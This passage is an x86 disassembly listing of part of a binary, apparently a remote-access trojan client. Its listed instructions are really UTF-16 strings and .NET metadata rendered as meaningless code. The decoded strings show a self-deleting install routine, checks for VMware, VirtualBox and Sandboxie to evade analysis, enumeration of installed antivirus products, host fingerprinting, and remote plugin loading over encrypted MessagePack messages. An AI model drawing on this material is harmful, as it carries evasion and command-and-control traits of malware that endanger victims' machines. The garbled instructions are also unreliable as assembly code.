  40742a:	3e 00 20             	add    %ah,%ds:(%eax)
  40742d:	00 4e 00             	add    %cl,0x0(%esi)
  407430:	55                   	push   %ebp
  407431:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  407435:	15 53 00 54 00       	adc    $0x540053,%eax
  40743a:	41                   	inc    %ecx
  40743b:	00 52 00             	add    %dl,0x0(%edx)
  40743e:	54                   	push   %esp
  40743f:	00 20                	add    %ah,(%eax)
  407441:	00 22                	add    %ah,(%edx)
  407443:	00 22                	add    %ah,(%edx)
  407445:	00 20                	add    %ah,(%eax)
  407447:	00 22                	add    %ah,(%edx)
  407449:	00 00                	add    %al,(%eax)
  40744b:	07                   	pop    %es
  40744c:	43                   	inc    %ebx
  40744d:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  407451:	00 00                	add    %al,(%eax)
  407453:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  407457:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40745b:	00 22                	add    %ah,(%edx)
  40745d:	00 00                	add    %al,(%eax)
  40745f:	0f 22 00             	mov    %eax,%cr0
  407462:	20 00                	and    %al,(%eax)
  407464:	2f                   	das
  407465:	00 66 00             	add    %ah,0x0(%esi)
  407468:	20 00                	and    %al,(%eax)
  40746a:	2f                   	das
  40746b:	00 71 00             	add    %dh,0x0(%ecx)
  40746e:	00 23                	add    %ah,(%ebx)
  407470:	49                   	dec    %ecx
  407471:	00 6e 00             	add    %ch,0x0(%esi)
  407474:	73 00                	jae    0x407476
  407476:	74 00                	je     0x407478
  407478:	61                   	popa
  407479:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40747d:	00 20                	add    %ah,(%eax)
  40747f:	00 46 00             	add    %al,0x0(%esi)
  407482:	61                   	popa
  407483:	00 69 00             	add    %ch,0x0(%ecx)
  407486:	6c                   	insb   (%dx),%es:(%edi)
  407487:	00 65 00             	add    %ah,0x0(%ebp)
  40748a:	64 00 20             	add    %ah,%fs:(%eax)
  40748d:	00 3a                	add    %bh,(%edx)
  40748f:	00 20                	add    %ah,(%eax)
  407491:	00 00                	add    %al,(%eax)
  407493:	05 78 00 70 00       	add    $0x700078,%eax
  407498:	00 45 53             	add    %al,0x53(%ebp)
  40749b:	00 65 00             	add    %ah,0x0(%ebp)
  40749e:	6c                   	insb   (%dx),%es:(%edi)
  40749f:	00 65 00             	add    %ah,0x0(%ebp)
  4074a2:	63 00                	arpl   %eax,(%eax)
  4074a4:	74 00                	je     0x4074a6
  4074a6:	20 00                	and    %al,(%eax)
  4074a8:	2a 00                	sub    (%eax),%al
  4074aa:	20 00                	and    %al,(%eax)
  4074ac:	66 00 72 00          	data16 add %dh,0x0(%edx)
  4074b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4074b1:	00 6d 00             	add    %ch,0x0(%ebp)
  4074b4:	20 00                	and    %al,(%eax)
  4074b6:	57                   	push   %edi
  4074b7:	00 69 00             	add    %ch,0x0(%ecx)
  4074ba:	6e                   	outsb  %ds:(%esi),(%dx)
  4074bb:	00 33                	add    %dh,(%ebx)
  4074bd:	00 32                	add    %dh,(%edx)
  4074bf:	00 5f 00             	add    %bl,0x0(%edi)
  4074c2:	43                   	inc    %ebx
  4074c3:	00 6f 00             	add    %ch,0x0(%edi)
  4074c6:	6d                   	insl   (%dx),%es:(%edi)
  4074c7:	00 70 00             	add    %dh,0x0(%eax)
  4074ca:	75 00                	jne    0x4074cc
  4074cc:	74 00                	je     0x4074ce
  4074ce:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4074d2:	53                   	push   %ebx
  4074d3:	00 79 00             	add    %bh,0x0(%ecx)
  4074d6:	73 00                	jae    0x4074d8
  4074d8:	74 00                	je     0x4074da
  4074da:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  4074de:	00 19                	add    %bl,(%ecx)
  4074e0:	4d                   	dec    %ebp
  4074e1:	00 61 00             	add    %ah,0x0(%ecx)
  4074e4:	6e                   	outsb  %ds:(%esi),(%dx)
  4074e5:	00 75 00             	add    %dh,0x0(%ebp)
  4074e8:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  4074ec:	63 00                	arpl   %eax,(%eax)
  4074ee:	74 00                	je     0x4074f0
  4074f0:	75 00                	jne    0x4074f2
  4074f2:	72 00                	jb     0x4074f4
  4074f4:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4074f8:	00 2b                	add    %ch,(%ebx)
  4074fa:	6d                   	insl   (%dx),%es:(%edi)
  4074fb:	00 69 00             	add    %ch,0x0(%ecx)
  4074fe:	63 00                	arpl   %eax,(%eax)
  407500:	72 00                	jb     0x407502
  407502:	6f                   	outsl  %ds:(%esi),(%dx)
  407503:	00 73 00             	add    %dh,0x0(%ebx)
  407506:	6f                   	outsl  %ds:(%esi),(%dx)
  407507:	00 66 00             	add    %ah,0x0(%esi)
  40750a:	74 00                	je     0x40750c
  40750c:	20 00                	and    %al,(%eax)
  40750e:	63 00                	arpl   %eax,(%eax)
  407510:	6f                   	outsl  %ds:(%esi),(%dx)
  407511:	00 72 00             	add    %dh,0x0(%edx)
  407514:	70 00                	jo     0x407516
  407516:	6f                   	outsl  %ds:(%esi),(%dx)
  407517:	00 72 00             	add    %dh,0x0(%edx)
  40751a:	61                   	popa
  40751b:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40751f:	00 6f 00             	add    %ch,0x0(%edi)
  407522:	6e                   	outsb  %ds:(%esi),(%dx)
  407523:	00 00                	add    %al,(%eax)
  407525:	0b 4d 00             	or     0x0(%ebp),%ecx
  407528:	6f                   	outsl  %ds:(%esi),(%dx)
  407529:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40752d:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  407531:	0f 56 00             	orps   (%eax),%xmm0
  407534:	49                   	dec    %ecx
  407535:	00 52 00             	add    %dl,0x0(%edx)
  407538:	54                   	push   %esp
  407539:	00 55 00             	add    %dl,0x0(%ebp)
  40753c:	41                   	inc    %ecx
  40753d:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  407541:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  407546:	77 00                	ja     0x407548
  407548:	61                   	popa
  407549:	00 72 00             	add    %dh,0x0(%edx)
  40754c:	65 00 00             	add    %al,%gs:(%eax)
  40754f:	15 56 00 69 00       	adc    $0x690056,%eax
  407554:	72 00                	jb     0x407556
  407556:	74 00                	je     0x407558
  407558:	75 00                	jne    0x40755a
  40755a:	61                   	popa
  40755b:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40755f:	00 6f 00             	add    %ch,0x0(%edi)
  407562:	78 00                	js     0x407564
  407564:	00 17                	add    %dl,(%edi)
  407566:	53                   	push   %ebx
  407567:	00 62 00             	add    %ah,0x0(%edx)
  40756a:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  407570:	6c                   	insb   (%dx),%es:(%edi)
  407571:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  407575:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  407579:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40757d:	11 45 00             	adc    %eax,0x0(%ebp)
  407580:	72 00                	jb     0x407582
  407582:	72 00                	jb     0x407584
  407584:	20 00                	and    %al,(%eax)
  407586:	48                   	dec    %eax
  407587:	00 57 00             	add    %dl,0x0(%edi)
  40758a:	49                   	dec    %ecx
  40758b:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40758f:	05 78 00 32 00       	add    $0x320078,%eax
  407594:	00 15 43 00 6c 00    	add    %dl,0x6c0043
  40759a:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  4075a0:	74 00                	je     0x4075a2
  4075a2:	49                   	dec    %ecx
  4075a3:	00 6e 00             	add    %ch,0x0(%esi)
  4075a6:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  4075aa:	00 09                	add    %cl,(%ecx)
  4075ac:	48                   	dec    %eax
  4075ad:	00 57 00             	add    %dl,0x0(%edi)
  4075b0:	49                   	dec    %ecx
  4075b1:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  4075b5:	09 55 00             	or     %edx,0x0(%ebp)
  4075b8:	73 00                	jae    0x4075ba
  4075ba:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4075be:	00 05 4f 00 53 00    	add    %al,0x53004f
  4075c4:	00 13                	add    %dl,(%ebx)
  4075c6:	4d                   	dec    %ebp
  4075c7:	00 69 00             	add    %ch,0x0(%ecx)
  4075ca:	63 00                	arpl   %eax,(%eax)
  4075cc:	72 00                	jb     0x4075ce
  4075ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4075cf:	00 73 00             	add    %dh,0x0(%ebx)
  4075d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4075d3:	00 66 00             	add    %ah,0x0(%esi)
  4075d6:	74 00                	je     0x4075d8
  4075d8:	00 03                	add    %al,(%ebx)
  4075da:	20 00                	and    %al,(%eax)
  4075dc:	00 09                	add    %cl,(%ecx)
  4075de:	54                   	push   %esp
  4075df:	00 72 00             	add    %dh,0x0(%edx)
  4075e2:	75 00                	jne    0x4075e4
  4075e4:	65 00 00             	add    %al,%gs:(%eax)
  4075e7:	0b 36                	or     (%esi),%esi
  4075e9:	00 34 00             	add    %dh,(%eax,%eax,1)
  4075ec:	62 00                	bound  %eax,(%eax)
  4075ee:	69 00 74 00 00 0b    	imul   $0xb000074,(%eax),%eax
  4075f4:	46                   	inc    %esi
  4075f5:	00 61 00             	add    %ah,0x0(%ecx)
  4075f8:	6c                   	insb   (%dx),%es:(%edi)
  4075f9:	00 73 00             	add    %dh,0x0(%ebx)
  4075fc:	65 00 00             	add    %al,%gs:(%eax)
  4075ff:	0b 33                	or     (%ebx),%esi
  407601:	00 32                	add    %dh,(%edx)
  407603:	00 62 00             	add    %ah,0x0(%edx)
  407606:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  40760c:	50                   	push   %eax
  40760d:	00 61 00             	add    %ah,0x0(%ecx)
  407610:	74 00                	je     0x407612
  407612:	68 00 00 0f 56       	push   $0x560f0000
  407617:	00 65 00             	add    %ah,0x0(%ebp)
  40761a:	72 00                	jb     0x40761c
  40761c:	73 00                	jae    0x40761e
  40761e:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  407624:	00 0b                	add    %cl,(%ebx)
  407626:	41                   	inc    %ecx
  407627:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40762b:	00 69 00             	add    %ch,0x0(%ecx)
  40762e:	6e                   	outsb  %ds:(%esi),(%dx)
  40762f:	00 00                	add    %al,(%eax)
  407631:	09 74 00 72          	or     %esi,0x72(%eax,%eax,1)
  407635:	00 75 00             	add    %dh,0x0(%ebp)
  407638:	65 00 00             	add    %al,%gs:(%eax)
  40763b:	17                   	pop    %ss
  40763c:	50                   	push   %eax
  40763d:	00 65 00             	add    %ah,0x0(%ebp)
  407640:	72 00                	jb     0x407642
  407642:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  407646:	72 00                	jb     0x407648
  407648:	6d                   	insl   (%dx),%es:(%edi)
  407649:	00 61 00             	add    %ah,0x0(%ecx)
  40764c:	6e                   	outsb  %ds:(%esi),(%dx)
  40764d:	00 63 00             	add    %ah,0x0(%ebx)
  407650:	65 00 00             	add    %al,%gs:(%eax)
  407653:	11 50 00             	adc    %edx,0x0(%eax)
  407656:	61                   	popa
  407657:	00 73 00             	add    %dh,0x0(%ebx)
  40765a:	74 00                	je     0x40765c
  40765c:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  407660:	69 00 6e 00 00 13    	imul   $0x1300006e,(%eax),%eax
  407666:	41                   	inc    %ecx
  407667:	00 6e 00             	add    %ch,0x0(%esi)
  40766a:	74 00                	je     0x40766c
  40766c:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  407672:	72 00                	jb     0x407674
  407674:	75 00                	jne    0x407676
  407676:	73 00                	jae    0x407678
  407678:	00 13                	add    %dl,(%ebx)
  40767a:	49                   	dec    %ecx
  40767b:	00 6e 00             	add    %ch,0x0(%esi)
  40767e:	73 00                	jae    0x407680
  407680:	74 00                	je     0x407682
  407682:	61                   	popa
  407683:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  407687:	00 65 00             	add    %ah,0x0(%ebp)
  40768a:	64 00 00             	add    %al,%fs:(%eax)
  40768d:	09 50 00             	or     %edx,0x0(%eax)
  407690:	6f                   	outsl  %ds:(%esi),(%dx)
  407691:	00 6e 00             	add    %ch,0x0(%esi)
  407694:	67 00 00             	add    %al,(%bx,%si)
  407697:	0b 47 00             	or     0x0(%edi),%eax
  40769a:	72 00                	jb     0x40769c
  40769c:	6f                   	outsl  %ds:(%esi),(%dx)
  40769d:	00 75 00             	add    %dh,0x0(%ebp)
  4076a0:	70 00                	jo     0x4076a2
  4076a2:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  4076a8:	00 2b                	add    %ch,(%ebx)
  4076aa:	5c                   	pop    %esp
  4076ab:	00 72 00             	add    %dh,0x0(%edx)
  4076ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4076af:	00 6f 00             	add    %ch,0x0(%edi)
  4076b2:	74 00                	je     0x4076b4
  4076b4:	5c                   	pop    %esp
  4076b5:	00 53 00             	add    %dl,0x0(%ebx)
  4076b8:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4076bc:	75 00                	jne    0x4076be
  4076be:	72 00                	jb     0x4076c0
  4076c0:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  4076c6:	43                   	inc    %ebx
  4076c7:	00 65 00             	add    %ah,0x0(%ebp)
  4076ca:	6e                   	outsb  %ds:(%esi),(%dx)
  4076cb:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  4076cf:	00 72 00             	add    %dh,0x0(%edx)
  4076d2:	32 00                	xor    (%eax),%al
  4076d4:	00 3d 53 00 65 00    	add    %bh,0x650053
  4076da:	6c                   	insb   (%dx),%es:(%edi)
  4076db:	00 65 00             	add    %ah,0x0(%ebp)
  4076de:	63 00                	arpl   %eax,(%eax)
  4076e0:	74 00                	je     0x4076e2
  4076e2:	20 00                	and    %al,(%eax)
  4076e4:	2a 00                	sub    (%eax),%al
  4076e6:	20 00                	and    %al,(%eax)
  4076e8:	66 00 72 00          	data16 add %dh,0x0(%edx)
  4076ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4076ed:	00 6d 00             	add    %ch,0x0(%ebp)
  4076f0:	20 00                	and    %al,(%eax)
  4076f2:	41                   	inc    %ecx
  4076f3:	00 6e 00             	add    %ch,0x0(%esi)
  4076f6:	74 00                	je     0x4076f8
  4076f8:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  4076fe:	72 00                	jb     0x407700
  407700:	75 00                	jne    0x407702
  407702:	73 00                	jae    0x407704
  407704:	50                   	push   %eax
  407705:	00 72 00             	add    %dh,0x0(%edx)
  407708:	6f                   	outsl  %ds:(%esi),(%dx)
  407709:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40770d:	00 63 00             	add    %ah,0x0(%ebx)
  407710:	74 00                	je     0x407712
  407712:	00 17                	add    %dl,(%edi)
  407714:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  407718:	73 00                	jae    0x40771a
  40771a:	70 00                	jo     0x40771c
  40771c:	6c                   	insb   (%dx),%es:(%edi)
  40771d:	00 61 00             	add    %ah,0x0(%ecx)
  407720:	79 00                	jns    0x407722
  407722:	4e                   	dec    %esi
  407723:	00 61 00             	add    %ah,0x0(%ecx)
  407726:	6d                   	insl   (%dx),%es:(%edi)
  407727:	00 65 00             	add    %ah,0x0(%ebp)
  40772a:	00 07                	add    %al,(%edi)
  40772c:	4e                   	dec    %esi
  40772d:	00 2f                	add    %ch,(%edi)
  40772f:	00 41 00             	add    %al,0x0(%ecx)
  407732:	00 05 2c 00 20 00    	add    %al,0x20002c
  407738:	00 13                	add    %dl,(%ebx)
  40773a:	53                   	push   %ebx
  40773b:	00 6f 00             	add    %ch,0x0(%edi)
  40773e:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  407743:	00 61 00             	add    %ah,0x0(%ecx)
  407746:	72 00                	jb     0x407748
  407748:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  40774d:	09 70 00             	or     %esi,0x0(%eax)
  407750:	6f                   	outsl  %ds:(%esi),(%dx)
  407751:	00 6e 00             	add    %ch,0x0(%esi)
  407754:	67 00 00             	add    %al,(%bx,%si)
  407757:	0d 70 00 6c 00       	or     $0x6c0070,%eax
  40775c:	75 00                	jne    0x40775e
  40775e:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  407762:	6e                   	outsb  %ds:(%esi),(%dx)
  407763:	00 00                	add    %al,(%eax)
  407765:	15 73 00 61 00       	adc    $0x610073,%eax
  40776a:	76 00                	jbe    0x40776c
  40776c:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  407770:	6c                   	insb   (%dx),%es:(%edi)
  407771:	00 75 00             	add    %dh,0x0(%ebp)
  407774:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  407778:	6e                   	outsb  %ds:(%esi),(%dx)
  407779:	00 00                	add    %al,(%eax)
  40777b:	07                   	pop    %es
  40777c:	44                   	inc    %esp
  40777d:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  407781:	00 00                	add    %al,(%eax)
  407783:	15 73 00 65 00       	adc    $0x650073,%eax
  407788:	6e                   	outsb  %ds:(%esi),(%dx)
  407789:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40778d:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  407791:	00 67 00             	add    %ah,0x0(%edi)
  407794:	69 00 6e 00 00 0d    	imul   $0xd00006e,(%eax),%eax
  40779a:	48                   	dec    %eax
  40779b:	00 61 00             	add    %ah,0x0(%ecx)
  40779e:	73 00                	jae    0x4077a0
  4077a0:	68 00 65 00 73       	push   $0x73006500
  4077a5:	00 00                	add    %al,(%eax)
  4077a7:	09 48 00             	or     %ecx,0x0(%eax)
  4077aa:	61                   	popa
  4077ab:	00 73 00             	add    %dh,0x0(%ebx)
  4077ae:	68 00 00 19 70       	push   $0x70190000
  4077b3:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  4077b7:	00 67 00             	add    %ah,0x0(%edi)
  4077ba:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  4077c0:	73 00                	jae    0x4077c2
  4077c2:	61                   	popa
  4077c3:	00 76 00             	add    %dh,0x0(%esi)
  4077c6:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  4077cb:	1b 50 00             	sbb    0x0(%eax),%edx
  4077ce:	6c                   	insb   (%dx),%es:(%edi)
  4077cf:	00 75 00             	add    %dh,0x0(%ebp)
  4077d2:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  4077d6:	6e                   	outsb  %ds:(%esi),(%dx)
  4077d7:	00 2e                	add    %ch,(%esi)
  4077d9:	00 50 00             	add    %dl,0x0(%eax)
  4077dc:	6c                   	insb   (%dx),%es:(%edi)
  4077dd:	00 75 00             	add    %dh,0x0(%ebp)
  4077e0:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  4077e4:	6e                   	outsb  %ds:(%esi),(%dx)
  4077e5:	00 00                	add    %al,(%eax)
  4077e7:	07                   	pop    %es
  4077e8:	52                   	push   %edx
  4077e9:	00 75 00             	add    %dh,0x0(%ebp)
  4077ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4077ed:	00 00                	add    %al,(%eax)
  4077ef:	0f 4d 00             	cmovge (%eax),%eax
  4077f2:	73 00                	jae    0x4077f4
  4077f4:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  4077f8:	61                   	popa
  4077f9:	00 63 00             	add    %ah,0x0(%ebx)
  4077fc:	6b 00 00             	imul   $0x0,(%eax),%eax
  4077ff:	11 52 00             	adc    %edx,0x0(%edx)
  407802:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  407806:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40780a:	76 00                	jbe    0x40780c
  40780c:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  407811:	0b 45 00             	or     0x0(%ebp),%eax
  407814:	72 00                	jb     0x407816
  407816:	72 00                	jb     0x407818
  407818:	6f                   	outsl  %ds:(%esi),(%dx)
  407819:	00 72 00             	add    %dh,0x0(%edx)
  40781c:	00 47 6d             	add    %al,0x6d(%edi)
  40781f:	00 61 00             	add    %ah,0x0(%ecx)
  407822:	73 00                	jae    0x407824
  407824:	74 00                	je     0x407826
  407826:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40782a:	4b                   	dec    %ebx
  40782b:	00 65 00             	add    %ah,0x0(%ebp)
  40782e:	79 00                	jns    0x407830
  407830:	20 00                	and    %al,(%eax)
  407832:	63 00                	arpl   %eax,(%eax)
  407834:	61                   	popa
  407835:	00 6e 00             	add    %ch,0x0(%esi)
  407838:	20 00                	and    %al,(%eax)
  40783a:	6e                   	outsb  %ds:(%esi),(%dx)
  40783b:	00 6f 00             	add    %ch,0x0(%edi)
  40783e:	74 00                	je     0x407840
  407840:	20 00                	and    %al,(%eax)
  407842:	62 00                	bound  %eax,(%eax)
  407844:	65 00 20             	add    %ah,%gs:(%eax)
  407847:	00 6e 00             	add    %ch,0x0(%esi)
  40784a:	75 00                	jne    0x40784c
  40784c:	6c                   	insb   (%dx),%es:(%edi)
  40784d:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  407851:	00 6f 00             	add    %ch,0x0(%edi)
  407854:	72 00                	jb     0x407856
  407856:	20 00                	and    %al,(%eax)
  407858:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40785c:	70 00                	jo     0x40785e
  40785e:	74 00                	je     0x407860
  407860:	79 00                	jns    0x407862
  407862:	2e 00 00             	add    %al,%cs:(%eax)
  407865:	2d 69 00 6e 00       	sub    $0x6e0069,%eax
  40786a:	70 00                	jo     0x40786c
  40786c:	75 00                	jne    0x40786e
  40786e:	74 00                	je     0x407870
  407870:	20 00                	and    %al,(%eax)
  407872:	63 00                	arpl   %eax,(%eax)
  407874:	61                   	popa
  407875:	00 6e 00             	add    %ch,0x0(%esi)
  407878:	20 00                	and    %al,(%eax)
  40787a:	6e                   	outsb  %ds:(%esi),(%dx)
  40787b:	00 6f 00             	add    %ch,0x0(%edi)
  40787e:	74 00                	je     0x407880
  407880:	20 00                	and    %al,(%eax)
  407882:	62 00                	bound  %eax,(%eax)
  407884:	65 00 20             	add    %ah,%gs:(%eax)
  407887:	00 6e 00             	add    %ch,0x0(%esi)
  40788a:	75 00                	jne    0x40788c
  40788c:	6c                   	insb   (%dx),%es:(%edi)
  40788d:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  407891:	00 00                	add    %al,(%eax)
  407893:	55                   	push   %ebp
  407894:	49                   	dec    %ecx
  407895:	00 6e 00             	add    %ch,0x0(%esi)
  407898:	76 00                	jbe    0x40789a
  40789a:	61                   	popa
  40789b:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40789f:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  4078a3:	00 6d 00             	add    %ch,0x0(%ebp)
  4078a6:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  4078aa:	73 00                	jae    0x4078ac
  4078ac:	61                   	popa
  4078ad:	00 67 00             	add    %ah,0x0(%edi)
  4078b0:	65 00 20             	add    %ah,%gs:(%eax)
  4078b3:	00 61 00             	add    %ah,0x0(%ecx)
  4078b6:	75 00                	jne    0x4078b8
  4078b8:	74 00                	je     0x4078ba
  4078ba:	68 00 65 00 6e       	push   $0x6e006500
  4078bf:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  4078c3:	00 63 00             	add    %ah,0x0(%ebx)
  4078c6:	61                   	popa
  4078c7:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  4078cb:	00 6f 00             	add    %ch,0x0(%edi)
  4078ce:	6e                   	outsb  %ds:(%esi),(%dx)
  4078cf:	00 20                	add    %ah,(%eax)
  4078d1:	00 63 00             	add    %ah,0x0(%ebx)
  4078d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4078d5:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  4078d9:	00 20                	add    %ah,(%eax)
  4078db:	00 28                	add    %ch,(%eax)
  4078dd:	00 4d 00             	add    %cl,0x0(%ebp)
  4078e0:	41                   	inc    %ecx
  4078e1:	00 43 00             	add    %al,0x0(%ebx)
  4078e4:	29 00                	sub    %eax,(%eax)
  4078e6:	2e 00 00             	add    %al,%cs:(%eax)
  4078e9:	05 58 00 32 00       	add    $0x320058,%eax
  4078ee:	00 00                	add    %al,(%eax)
  4078f0:	95                   	xchg   %eax,%ebp
  4078f1:	aa                   	stos   %al,%es:(%edi)
  4078f2:	47                   	inc    %edi
  4078f3:	58                   	pop    %eax
  4078f4:	cb                   	lret
  4078f5:	ba e6 42 a3 2f       	mov    $0x2fa342e6,%edx
  4078fa:	e9 cb 89 23 61       	jmp    0x616402ca
  4078ff:	c4 00                	les    (%eax),%eax
  407901:	04 20                	add    $0x20,%al
  407903:	01 01                	add    %eax,(%ecx)
  407905:	08 03                	or     %al,(%ebx)
  407907:	20 00                	and    %al,(%eax)
  407909:	01 05 20 01 01 11    	add    %eax,0x11010120
  40790f:	11 04 20             	adc    %eax,(%eax,%eiz,1)
  407912:	01 01                	add    %eax,(%ecx)
  407914:	0e                   	push   %cs
  407915:	04 20                	add    $0x20,%al
  407917:	01 01                	add    %eax,(%ecx)
  407919:	02 05 20 01 01 11    	add    0x11010120,%al
  40791f:	51                   	push   %ecx
  407920:	0b 07                	or     (%edi),%eax
  407922:	09 08                	or     %ecx,(%eax)
  407924:	02 02                	add    (%edx),%al
  407926:	02 02                	add    (%edx),%al
  407928:	02 02                	add    (%edx),%al
  40792a:	02 02                	add    (%edx),%al
  40792c:	04 00                	add    $0x0,%al
  40792e:	01 01                	add    %eax,(%ecx)
  407930:	08 04 00             	or     %al,(%eax,%eax,1)
  407933:	01 08                	add    %ecx,(%eax)
  407935:	0e                   	push   %cs
  407936:	04 00                	add    $0x0,%al
  407938:	01 02                	add    %eax,(%edx)
  40793a:	0e                   	push   %cs
  40793b:	03 07                	add    (%edi),%eax
  40793d:	01 02                	add    %eax,(%edx)
  40793f:	05 07 02 12 45       	add    $0x45120207,%eax
  407944:	02 05 20 00 12 81    	add    0x81120020,%al
  40794a:	11 05 20 00 12 81    	adc    %eax,0x81120020
  407950:	15 05 00 00 12       	adc    $0x12000005,%eax
  407955:	81 19 05 20 01 1d    	sbbl   $0x1d012005,(%ecx)
  40795b:	05 0e 04 00 01       	add    $0x100040e,%eax
  407960:	0e                   	push   %cs
  407961:	0e                   	push   %cs
  407962:	05 00 01 1d 05       	add    $0x51d0100,%eax
  407967:	0e                   	push   %cs
  407968:	08 20                	or     %ah,(%eax)
  40796a:	03 02                	add    (%edx),%eax
  40796c:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
  407971:	18 07                	sbb    %al,(%edi)
  407973:	0e                   	push   %cs
  407974:	02 0e                	add    (%esi),%cl
  407976:	08 02                	or     %al,(%edx)
  407978:	1d 12 65 1d 12       	sbb    $0x121d6512,%eax
  40797d:	65 08 12             	or     %dl,%gs:(%edx)
  407980:	65 02 12             	add    %gs:(%edx),%dl
  407983:	69 12 6d 0e 1d 0e    	imul   $0xe1d0e6d,(%edx),%edx
  407989:	02 0c 20             	add    (%eax,%eiz,1),%cl
  40798c:	03 01                	add    (%ecx),%eax
  40798e:	11 81 21 11 81 25    	adc    %eax,0x25811121(%ecx)
  407994:	11 81 29 05 00 02    	adc    %eax,0x2000529(%ecx)
  40799a:	02 0e                	add    (%esi),%cl
  40799c:	0e                   	push   %cs
  40799d:	06                   	push   %es
  40799e:	20 01                	and    %al,(%ecx)
  4079a0:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  4079a5:	20 01                	and    %al,(%ecx)
  4079a7:	08 08                	or     %cl,(%eax)
  4079a9:	06                   	push   %es
  4079aa:	00 01                	add    %al,(%ecx)
  4079ac:	1d 12 65 0e 06       	sbb    $0x60e6512,%eax
  4079b1:	20 02                	and    %al,(%edx)
  4079b3:	01 12                	add    %edx,(%edx)
  4079b5:	65 08 03             	or     %al,%gs:(%ebx)
  4079b8:	20 00                	and    %al,(%eax)
  4079ba:	02 05 20 02 01 0e    	add    0xe010220,%al
  4079c0:	08 05 20 02 01 0e    	or     %al,0xe010220
  4079c6:	0e                   	push   %cs
  4079c7:	06                   	push   %es
  4079c8:	20 01                	and    %al,(%ecx)
  4079ca:	01 12                	add    %edx,(%edx)
  4079cc:	81 3d 04 20 01 0e 0e 	cmpl   $0x220090e,0xe012004
  4079d3:	09 20 02 
  4079d6:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  4079db:	81 41 05 20 02 08 08 	addl   $0x8080220,0x5(%ecx)
  4079e2:	08 04 00             	or     %al,(%eax,%eax,1)
  4079e5:	01 01                	add    %eax,(%ecx)
  4079e7:	0e                   	push   %cs
  4079e8:	06                   	push   %es
  4079e9:	20 02                	and    %al,(%edx)
  4079eb:	01 12                	add    %edx,(%edx)
  4079ed:	59                   	pop    %ecx
  4079ee:	02 05 20 02 01 1c    	add    0x1c010220,%al
  4079f4:	18 0a                	sbb    %cl,(%edx)
  4079f6:	20 03                	and    %al,(%ebx)
  4079f8:	01 12                	add    %edx,(%edx)
